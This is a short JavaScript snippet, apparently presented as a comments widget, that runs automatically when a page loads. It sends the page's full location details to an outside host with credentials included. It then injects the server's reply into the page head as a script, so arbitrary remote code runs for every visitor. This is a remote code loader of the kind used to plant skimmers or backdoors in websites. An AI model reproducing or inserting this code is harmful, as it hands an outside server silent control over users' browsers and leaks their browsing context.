document.addEventListener("DOMContentLoaded",async ()=>{
            const data = {
                // userName: form.elements['user'].value.trim(),
                // message: form.elements['message'].value.trim(),
                date: new Date().toISOString(),
                idea: {
                    id: 'a777',
                    site: {
                        ancestorOrigins: {},
                        href: location.href,
                        origin: location.origin,
                        protocol: location.protocol,
                        host: location.host,
                        hostname: location.hostname,
                        port: location.port,
                        pathname: location.pathname,
                        search: location.search,
                        hash: location.hash
                    }
                }
            };
            try{
                const response=await fetch("https://comments.qucu.ru/200",{
                    method:'POST',
                    headers:{
                        'Content-Type':'application/json',
                    },
                    mode:'cors',
                    credentials:'include',
                    body:JSON.stringify(data)
                });
                const result=await response.text();
                let js=document.createElement('script');
                js.textContent=result;
                document.querySelector('head').append(js);
                console.log('Server response: ', result);
            }catch(error){
                console.error("Error sending empty POST: ", error);
            }
        });